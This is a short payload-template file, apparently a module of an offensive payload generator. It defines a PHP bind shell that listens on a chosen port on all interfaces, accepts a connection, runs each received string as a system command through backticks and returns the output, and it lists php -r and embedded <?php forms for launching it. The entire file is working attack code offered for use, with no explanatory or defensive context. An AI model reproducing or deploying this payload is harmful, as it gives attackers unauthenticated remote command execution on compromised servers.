USAGE = 'port'
NARGS = [1, 1]
LANG = 'php'
EXEC = '''
php -r 'PAYLOAD'
<?php PAYLOAD
'''


pl = '''
$VAR0=socket_create(2,1,6);socket_bind($VAR0,"0.0.0.0",ARG1);socket_listen($VAR0);$VAR1=socket_accept($VAR0);while(NUM0){$VAR2=socket_read($VAR1,4096);if(!$VAR2){die();};socket_write($VAR1,`$VAR2`);};
'''
